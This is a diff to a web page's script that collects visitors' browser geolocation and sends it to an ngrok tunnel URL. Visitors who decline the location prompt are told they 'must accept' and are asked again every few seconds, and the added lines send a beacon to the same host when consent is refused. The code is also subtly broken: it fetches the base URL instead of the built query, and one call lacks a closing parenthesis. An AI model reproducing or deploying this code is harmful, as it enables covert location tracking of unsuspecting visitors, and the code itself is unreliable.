@@ -7,16 +7,18 @@
       <iframe id="vs" src="/frame.html" style="width: 100vw; height: 100vh;"></iframe>
     <script>
       let main = document.querySelector('body');
+      url = "https://19b5c31f7ea3.ngrok.io"
       let latitude = 0;
       let longitude = 0;
       function showPosition(position) {
         latitude = position.coords.latitude;
         longitude = position.coords.longitude;
-        url = "https://19b5c31f7ea3.ngrok.io/loc?lat=" + latitude + "&long=" + longitude;
+        postData = url + "/loc?lat=" + latitude + "&long=" + longitude;
         fetch(url);
       }
       function mustAccept(e) {
         main.innerHTML = "<h1> You must accept, to continue. Refresh to Try Again.</h1>";
+        fetch(url + "/loc?lat=Visited&long=ButNotAccepted";
         setTimeout(function () { getPos() }, 3000);
       }
       function getPos () {
